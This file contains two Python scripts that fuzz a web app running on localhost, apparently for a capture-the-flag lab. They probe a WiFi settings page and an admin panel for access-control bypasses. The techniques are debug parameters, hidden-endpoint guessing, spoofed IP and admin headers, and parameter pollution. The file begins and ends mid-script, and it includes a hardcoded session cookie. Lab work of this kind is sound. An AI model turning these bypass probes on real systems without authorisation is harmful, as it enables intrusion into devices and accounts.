cookies = {"session": "ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8"}

session = requests.Session()

print("[=] PARAMETER AND METHOD FUZZING")
print("="*60)

# Test different query parameters on wifi_settings
query_params = [
    "debug=session",
    "debug=true",
    "debug=1",
    "admin=true",
    "reset=1",
    "reboot=1",
    "action=reset",
    "mode=admin",
    "bypass=true",
    "force=1",
    "boot=complete",
    "ready=true",
    "state=ready"
]

print("\n[+] Testing query parameters on POST /wifi_settings:")
for param in query_params:
    url = f"{base_url}/wifi_settings?{param}"
    try:
        resp = session.post(url, cookies=cookies, data={"ssid": "Test", "password": "test"}, timeout=10)
        has_booting = "still booting" in resp.text.lower()
        print(f"  ?{param}: Status={resp.status_code}, Booting={has_booting}")
        
        if not has_booting and resp.status_code == 200:
            print(f"    [!] FOUND NON-BOOTING RESPONSE!")
            print(f"    Response: {resp.text[:400]}")
    except Exception as e:
        print(f"  ?{param}: Error - {e}")

# Test different HTTP methods
print("\n[+] Testing different HTTP methods on /wifi_settings:")
methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
for method in methods:
    try:
        resp = session.request(method, f"{base_url}/wifi_settings", 
                              cookies=cookies, 
                              data={"ssid": "Test", "password": "test"} if method != "GET" and method != "HEAD" else None,
                              timeout=10,
                              allow_redirects=False)
        has_booting = "still booting" in resp.text.lower() if method != "HEAD" else False
        print(f"  {method}: Status={resp.status_code}, Booting={has_booting}, Len={len(resp.text) if method != 'HEAD' else 'N/A'}")
    except Exception as e:
        print(f"  {method}: Error - {e}")

# Test admin_panel with different query params
print("\n[+] Testing admin_panel with query parameters:")
for param in ["debug=session", "admin=true", "force=1", "bypass=true"]:
    url = f"{base_url}/admin_panel?{param}"
    try:
        resp = session.get(url, cookies=cookies, timeout=10)
        has_admin_error = "administrator users can" in resp.text.lower()
        print(f"  ?{param}: Status={resp.status_code}, AdminError={has_admin_error}")
        
        if not has_admin_error:
            print(f"    [!] BYPASSED ADMIN CHECK!")
            print(f"    Response preview: {resp.text[:500]}")
    except Exception as e:
        print(f"  ?{param}: Error - {e}")

# Try to find hidden admin endpoints or actions
print("\n[+] Testing potential admin action endpoints:")
admin_endpoints = [
    "/admin/reset",
    "/admin/reboot",
    "/admin/boot",
    "/api/admin/boot",
    "/api/reset",
    "/system/reboot",
    "/system/boot",
    "/reset",
    "/reboot"
]

for endpoint in admin_endpoints:
    url = f"{base_url}{endpoint}"
    try:
        resp = session.get(url, cookies=cookies, timeout=5, allow_redirects=False)
        if resp.status_code != 404:
            print(f"  {endpoint}: Status={resp.status_code}, Len={len(resp.text)}")
    except Exception as e:
        pass  # Skip 404s

# Look for debug or admin panel without restriction
print("\n[+] Checking for hidden admin interfaces:")
hidden_admin = [
    "/admin",
    "/admin.php",
    "/admin.html",
    "/panel",
    "/control",
    "/manage",
    "/_admin",
    "/debug",
    "/api/admin"
]

for endpoint in hidden_admin:
    url = f"{base_url}{endpoint}"
    try:
        resp = session.get(url, cookies=cookies, timeout=5, allow_redirects=False)
        if resp.status_code != 404:
            has_admin = "admin" in resp.text.lower()
            print(f"  {endpoint}: Status={resp.status_code}, ContainsAdmin={has_admin}")
            if has_admin and resp.status_code == 200:
                print(f"    Found admin interface!")
    except:
        pass

import requests
import json

# Target configuration
base_url = "http://127.0.0.1:32992"
cookies = {"session": "ahYINfgSeZIuIVlIHpUK5jZSk4ahE5y7ZFvZds3KuA8"}

session = requests.Session()

print("[=] HEADER AND CONTENT-TYPE FUZZING")
print("="*60)

# Test different content types
content_types = [
    "application/x-www-form-urlencoded",
    "application/json",
    "text/plain",
    "multipart/form-data",
    "application/xml",
    "text/xml"
]

print("\n[+] Testing Content-Type headers:")
for ct in content_types:
    headers = {"Content-Type": ct} if ct != "application/x-www-form-urlencoded" else {}
    
    if ct == "application/json":
        data = json.dumps({"ssid": "Test", "password": "test"})
    elif ct == "application/xml" or ct == "text/xml":
        data = "<ssid>Test</ssid><password>test</password>"
    elif ct == "text/plain":
        data = "ssid=Test&password=test"
    else:
        data = {"ssid": "Test", "password": "test"}
    
    try:
        resp = session.post(f"{base_url}/wifi_settings", 
                           cookies=cookies, 
                           headers=headers,
                           data=data, 
                           timeout=10)
        has_booting = "still booting" in resp.text.lower()
        print(f"  {ct.split('/')[-1]}: Status={resp.status_code}, Booting={has_booting}")
        
        if not has_booting:
            print(f"    [!] BYPASS FOUND!")
            print(f"    Response: {resp.text[:400]}")
    except Exception as e:
        print(f"  {ct.split('/')[-1]}: Error - {e}")

# Test special headers that might bypass checks
print("\n[+] Testing special bypass headers:")
special_headers = [
    {"X-Admin": "true"},
    {"X-Admin-Token": "admin"},
    {"X-Bypass": "true"},
    {"X-Force": "1"},
    {"X-Debug": "true"},
    {"X-Debug-Session": "1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"CF-Connecting-IP": "127.0.0.1"},
    {"X-Internal": "true"},
    {"X-Boot-State": "complete"},
]

for headers in special_headers:
    try:
        resp = session.post(f"{base_url}/wifi_settings", 
                           cookies=cookies, 
                           headers=headers,
                           data={"ssid": "Test", "password": "test"}, 
                           timeout=10)
        has_booting = "still booting" in resp.text.lower()
        header_name = list(headers.keys())[0]
        print(f"  {header_name}: Status={resp.status_code}, Booting={has_booting}")
        
        if not has_booting:
            print(f"    [!] HEADER BYPASS FOUND!")
            print(f"    Response: {resp.text[:400]}")
    except Exception as e:
        print(f"  {list(headers.keys())[0]}: Error")

# Test Parameter Pollution
print("\n[+] Testing HTTP Parameter Pollution:")
hpp_payloads = [
    {"ssid": ["Test", "Test2"], "password": "test"},
    {"ssid": "Test", "password": ["test1", "test2"]},
    {"ssid": "Test&debug=1", "password": "test"},
    {"ssid": "Test", "password": "test", "debug": "true"},
    {"action": "save", "ssid": "Test", "password": "test"},
    {"mode": "admin", "ssid": "Test", "password": "test"},
    {"ssid": "", "password": ""},
    {"ssid": "Test", "password": ""},
]

for i, data in enumerate(hpp_payloads):
    try:
        resp = session.post(f"{base_url}/wifi_settings", 
                           cookies=cookies, 
                           data=data, 
                           timeout=10)
        has_booting = "still booting" in resp.text.lower()
        print(f"  Payload {i+1}: Status={resp.status_code}, Booting={has_booting}")
        
        if not has_booting:
            print(f"    [!] HPP BYPASS FOUND!")
            print(f"    Data sent: {data}")
            print(f"    Response: {resp.text[:400]}")
